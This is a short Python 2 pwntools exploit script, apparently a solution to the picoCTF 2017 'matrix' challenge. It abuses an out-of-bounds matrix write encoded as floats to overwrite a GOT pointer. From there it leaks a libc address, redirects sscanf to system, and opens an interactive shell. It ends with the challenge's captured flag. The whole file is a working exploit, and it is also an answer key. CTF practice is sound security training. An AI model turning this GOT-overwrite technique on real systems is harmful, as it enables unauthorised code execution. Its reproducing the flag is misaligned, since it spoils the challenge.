#! /usr/bin/env python2

from pwn import *
import struct

if args['REMOTE']:
    r = remote("shell2017.picoctf.com", 52501)
else:
    r = process("./matrix")

sscanf = 0x804a12c
off_system = 0x3e3e0
libc_base = 0

r.recvuntil("Enter command: ")
r.sendline("create 100 10")
r.recvuntil("Enter command: ")
r.sendline("create 100 10")

fv, = struct.unpack("<f", p32(sscanf))
print "fv = {}".format(fv)
r.recvuntil("Enter command: ")
r.sendline("set 0 10 4 " + str(fv))
r.recvuntil("Enter command: ")
r.sendline("get 1 0 0")
fv = float(r.recvline()[15:])
addr, = struct.unpack("<I", struct.pack("<f", fv))
print hex(addr)

libc_base = addr - 0x615a0
system = libc_base + off_system

print "system = {}".format(hex(system))

fv, = struct.unpack("<f", p32(system))
print "fv = {}".format(fv)
r.recvuntil("Enter command: ")
r.sendline("set 1 0 0 " + str(fv))
r.interactive()

# flag: 5d19abbdda3886fc91c195c8a3b0d8a1
